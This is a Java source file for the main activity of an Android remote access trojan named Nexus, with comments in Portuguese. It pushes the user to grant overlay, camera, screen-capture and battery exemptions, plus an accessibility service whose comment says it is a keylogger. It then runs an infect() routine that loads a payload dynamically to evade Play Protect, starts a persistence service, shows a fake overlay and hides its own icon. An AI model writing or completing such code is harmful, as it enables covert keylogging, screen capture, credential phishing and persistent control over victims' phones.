package com.nexus.client;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    private static final int REQ_OVERLAY = 100;
    private static final int REQ_CAMERA = 101;
    private static final int REQ_MEDIA_PROJECTION = 102;
    private static final int REQ_BATTERY_OPT = 103;
    private static final int REQ_ACCESSIBILITY = 104;

    private MediaProjectionManager projectionManager;
    private Intent mediaProjectionData = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        
        checkPermissions();
    }

    private void checkPermissions() {
        // 1. Overlay
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, REQ_OVERLAY);
            return;
        }

        // 2. Câmera
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, REQ_CAMERA);
            return;
        }

        // 3. MediaProjection (Captura de Tela)
        if (mediaProjectionData == null) {
            startActivityForResult(projectionManager.createScreenCaptureIntent(), REQ_MEDIA_PROJECTION);
            return;
        }

        // 4. Otimização de Bateria
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, REQ_BATTERY_OPT);
            return;
        }

        // 5. Acessibilidade (NexusKeylog) - Necessário para o RAT ler o teclado global
        // Verificamos se o serviço está ativo lendo as configurações do sistema
        if (!isAccessibilityServiceEnabled(this, NexusKeylog.class)) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivityForResult(intent, REQ_ACCESSIBILITY);
            Toast.makeText(this, "Ative o serviço de sistema para continuar.", Toast.LENGTH_LONG).show();
            return;
        }

        // Se passou por tudo, inicia a infecção
        infect();
    }

    // Função auxiliar para checar se o AccessibilityService está ativo
    private boolean isAccessibilityServiceEnabled(Context context, Class<?> serviceClass) {
        String enabledServicesSetting = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabledServicesSetting == null) return false;
        String componentName = context.getPackageName() + "/" + serviceClass.getName();
        return enabledServicesSetting.contains(componentName);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == REQ_OVERLAY) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
                checkPermissions();
            } else {
                Toast.makeText(this, "Overlay denied.", Toast.LENGTH_SHORT).show();
                checkPermissions(); 
            }
        } else if (requestCode == REQ_MEDIA_PROJECTION) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                mediaProjectionData = data;
                CommandRouter.setMediaProjectionData(data);
                checkPermissions();
            } else {
                finish();
            }
        } else if (requestCode == REQ_BATTERY_OPT || requestCode == REQ_ACCESSIBILITY) {
            checkPermissions();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CAMERA) {
            checkPermissions();
        }
    }

    private void infect() {
        // 1. Carrega o Payload via DexLoader (para burlar o Play Protect)
        DexLoader.load(this);

        // 2. Dispara o Serviço de Persistência
        Intent persistIntent = new Intent(this, PersistenceService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.startForegroundService(this, persistIntent);
        } else {
            startService(persistIntent);
        }

        // 3. Dispara Overlay falso (após 3s)
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            startService(new Intent(this, OverlayService.class));
        }, 3000);

        // 4. Esconde o ícone e finaliza
        hideAppIcon();
        finishAffinity();
    }

    private void hideAppIcon() {
        try {
            PackageManager p = getPackageManager();
            p.setComponentEnabledSetting(
                    new android.content.ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}